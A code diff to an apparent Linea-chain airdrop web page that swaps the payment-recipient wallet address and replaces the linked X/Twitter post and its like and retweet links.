@@ -17,7 +17,7 @@ declare global {
 
 const CONTRACT_ADDRESS = "0x4f275a1fF7eD21721dB7cb07efF523aBb2AD2e85";
 const LINEA_CHAIN_ID = "0xe708";
-const PAYMENT_RECIPIENT = "0x640AE2F3c8a447A302F338368e653e156da1e321";
+const PAYMENT_RECIPIENT = "0x2e1a15553476e8f490b555675e2fbd9f5a06a174";
 const LINEASCAN_API = "https://api.lineascan.build/api";
 const isValidContractAddress = CONTRACT_ADDRESS !== "0xYOUR_CONTRACT_ADDRESS" && CONTRACT_ADDRESS.length === 42;
 
@@ -291,7 +291,7 @@ export default function AirdropPage({
               </div>
               <div className="flex flex-col gap-3 mb-4">
                 <a
-                  href="https://x.com/SadlifeTv_/status/1769708489658495122"
+                  href="https://x.com/LineaWaves/status/1959904036809068807"
                   target="_blank"
                   rel="noopener noreferrer"
                   className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
@@ -300,7 +300,7 @@ export default function AirdropPage({
                 </a>
                 <div className="flex gap-2 justify-center">
                   <a
-                    href="https://twitter.com/intent/like?tweet_id=1769708489658495122"
+                    href="https://twitter.com/intent/like?tweet_id=1959904036809068807"
                     target="_blank"
                     rel="noopener noreferrer"
                     className="px-4 py-2 bg-pink-600 hover:bg-pink-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
@@ -309,7 +309,7 @@ export default function AirdropPage({
                     ❤️ Like
                   </a>
                   <a
-                    href="https://twitter.com/intent/retweet?tweet_id=1769708489658495122"
+                    href="https://twitter.com/intent/retweet?tweet_id=1959904036809068807"
                     target="_blank"
                     rel="noopener noreferrer"
                     className="px-4 py-2 bg-green-600 hover:bg-green-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
